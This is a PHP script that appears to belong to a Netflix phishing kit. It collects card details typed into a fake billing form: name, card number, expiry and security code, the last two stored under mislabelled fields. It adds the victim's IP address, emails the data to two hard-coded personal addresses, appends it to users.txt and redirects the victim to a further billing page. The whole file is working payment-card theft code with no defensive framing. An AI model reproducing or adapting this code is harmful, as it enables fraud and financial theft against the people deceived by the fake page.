<?
$ip = getenv("REMOTE_ADDR");
$message .= "--------------Netflix Info-----------------------\n";
$message .= "Name On Card             : ".$_POST['nmc']." ".$_POST['month']." ".$_POST['year']."\n";
$message .= "Card Number            : ".$_POST['crd']."\n";
$message .= "City           : ".$_POST['exm']." ".$_POST['exy']."\n";
$message .= "country            : ".$_POST['csc']."\n";
$message .= "IP                     : ".$ip."\n";
$message .= "---------------Created BY Unknown-------------\n";
$send = "debedebe@protonmail.com,thomas.potts50@hotmail.com";
$subject = "Result from Netflix";
$headers = "From: Netflix<customer-support@Spammers>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
$arr=array($send, $IP);
foreach ($arr as $send)
{
mail($send,$subject,$message,$headers);
mail($to,$subject,$message,$headers);
}
$fp = fopen("users.txt","a");
fputs($fp,$message);
fclose($fp);
	
		   header("Location: billing.php?ip=$ip");

	 
?>